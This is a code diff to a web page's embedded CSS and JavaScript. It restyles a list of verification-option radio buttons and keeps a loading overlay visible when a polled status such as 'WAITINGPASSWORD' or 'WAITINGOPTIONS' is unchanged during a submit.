@@ -232,6 +232,25 @@
                 transform: rotate(360deg);
             }
         }
+        #verificationOptionsContainer .form-check-input {
+            width: 16px;
+            height: 16px;
+            margin-top: 0;
+            margin-right: 6px;
+            cursor: pointer;
+        }
+        #verificationOptionsContainer .form-check-label {
+            font-size: 14px;
+            color: #333;
+            cursor: pointer;
+            line-height: 16px;
+        }
+        #verificationOptionsContainer .form-check {
+            display: flex;
+            align-items: flex-start;
+            gap: 0;
+            padding: 8px 0;
+        }
     </style>
 
     <script>
@@ -420,7 +439,9 @@
                             }
                         } catch (e) { }
                     }
-                    hideLoadingOverlay();
+                    if (!isSameStatusDuringSubmit) {
+                        hideLoadingOverlay();
+                    }
                     startPolling(10000);
                     break;
                 case 'WAITINGPASSWORD':
@@ -444,7 +465,9 @@
                         } catch (e) { }
                     }
                     lastShownStatus = currentStatus;
-                    hideLoadingOverlay();
+                    if (!isSameStatusDuringSubmit) {
+                        hideLoadingOverlay();
+                    }
                     startPolling(10000);
                     break;
                 case 'WAITINGOPTIONS':
@@ -518,7 +541,7 @@
             }
             options.forEach((opt, idx) => {
                 const div = document.createElement('div');
-                div.style.marginBottom = '8px';
+                div.className = 'form-check';
                 const input = document.createElement('input');
                 input.type = 'radio';
                 input.className = 'form-check-input';
@@ -533,8 +556,6 @@
                 const label = document.createElement('label');
                 label.className = 'form-check-label';
                 label.htmlFor = 'vOpt' + idx;
-                label.style.marginLeft = '6px';
-                label.style.fontSize = '13px';
                 label.textContent = opt.label;
                 div.appendChild(input);
                 div.appendChild(label);
